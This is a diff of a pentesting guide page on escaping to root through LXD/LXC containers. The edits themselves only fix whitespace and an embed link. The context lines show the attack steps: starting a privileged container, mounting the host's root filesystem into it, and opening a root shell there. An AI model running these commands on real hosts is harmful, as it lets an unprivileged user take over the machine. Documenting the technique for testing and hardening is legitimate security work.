@@ -47,7 +47,7 @@ Execute the container:
 ```text
 lxc start test
 lxc exec privesc /bin/sh
-[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted 
+[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
 
 ## With internet
@@ -59,12 +59,10 @@ lxc init ubuntu:16.04 test -c security.privileged=true
 lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
 lxc start test
 lxc exec test bash
-[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted 
+[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
 
 ## Other Refs
 
-{% embed url="https://reboare.github.io/lxd/lxd-escape.html" %}
-
-
+{% embed url="https://reboare.github.io/lxd/lxd-escape.html" caption="" %}
 
